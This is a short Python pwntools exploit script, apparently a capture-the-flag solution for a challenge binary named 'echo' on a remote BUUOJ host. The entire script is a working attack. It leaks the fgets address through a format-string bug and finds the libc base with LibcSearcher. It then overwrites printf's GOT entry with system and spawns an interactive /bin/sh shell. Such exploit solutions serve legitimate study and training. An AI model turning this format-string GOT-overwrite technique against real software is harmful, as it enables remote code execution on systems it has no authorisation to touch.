from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./echo')
io = remote('node4.buuoj.cn', 28212)
elf = ELF('./echo')

io.sendline(b'%8$s' + p32(elf.got['fgets']))
fgets = u32(io.recv(4))
libc = LibcSearcher('fgets', fgets)
base = fgets - libc.dump('fgets')
system = base + libc.dump('system')
payload = fmtstr_payload(7, {elf.got['printf']: system})

io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()
